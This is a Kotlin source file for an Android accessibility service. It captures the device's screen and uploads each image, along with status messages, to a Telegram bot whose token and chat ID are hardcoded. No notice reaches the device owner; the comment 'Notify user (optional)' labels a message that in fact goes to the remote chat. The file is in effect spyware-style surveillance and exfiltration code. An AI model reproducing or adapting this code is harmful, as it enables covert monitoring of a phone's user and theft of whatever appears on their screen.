package com.luffa

import android.accessibilityservice.AccessibilityService
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.view.Display
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
    }

    private var imageReader: ImageReader? = null
    var isConnected = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        isConnected = true
    }

    override fun onAccessibilityEvent(event: android.view.accessibility.AccessibilityEvent?) {}
    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        isConnected = false
    }

    fun takeScreenshot() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            CoroutineScope(Dispatchers.IO).launch {
                sendTelegramMessage("Screenshot requires Android 9+.")
            }
            return
        }
        try {
            val displayManager = getSystemService(DISPLAY_SERVICE) as DisplayManager
            val display = displayManager.getDisplay(Display.DEFAULT_DISPLAY)
            val metrics = DisplayMetrics()
            display.getMetrics(metrics)

            imageReader = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 2)
            val displayCapture = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY or
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC or
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_PRESENTATION

            val virtualDisplay = displayManager.createVirtualDisplay(
                "screenshot_display",
                metrics.widthPixels, metrics.heightPixels, metrics.densityDpi,
                imageReader!!.surface, displayCapture
            )

            imageReader!!.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    val planes = image.planes
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * metrics.widthPixels
                    val bitmap = android.graphics.Bitmap.createBitmap(
                        metrics.widthPixels + rowPadding / pixelStride, metrics.heightPixels, android.graphics.Bitmap.Config.ARGB_8888
                    )
                    bitmap.copyPixelsFromBuffer(buffer)
                    image.close()

                    val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
                    FileOutputStream(file).use { out ->
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, out)
                    }
                    virtualDisplay.release()
                    imageReader?.close()
                    imageReader = null

                    CoroutineScope(Dispatchers.IO).launch {
                        sendTelegramPhoto(file)
                        file.delete()
                    }
                } else {
                    virtualDisplay.release()
                    imageReader?.close()
                    imageReader = null
                }
            }, Handler(Looper.getMainLooper()))

            // Notify user (optional)
            CoroutineScope(Dispatchers.IO).launch {
                sendTelegramMessage("📸 Screenshot taken via accessibility.")
            }
        } catch (e: Exception) {
            CoroutineScope(Dispatchers.IO).launch {
                sendTelegramMessage("Screenshot failed: ${e.message}")
            }
        }
    }

    // ---- Telegram send methods ----
    private suspend fun sendTelegramMessage(text: String) {
        val client = OkHttpClient()
        val form = FormBody.Builder()
            .add("chat_id", "8820979221")
            .add("text", text)
            .build()
        client.newCall(Request.Builder().url("https://api.telegram.org/bot8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc/sendMessage").post(form).build()).execute()
    }

    private suspend fun sendTelegramPhoto(file: File) {
        val client = OkHttpClient()
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", "8820979221")
            .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaTypeOrNull()))
            .build()
        client.newCall(Request.Builder().url("https://api.telegram.org/bot8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc/sendPhoto").post(body).build()).execute()
    }
}
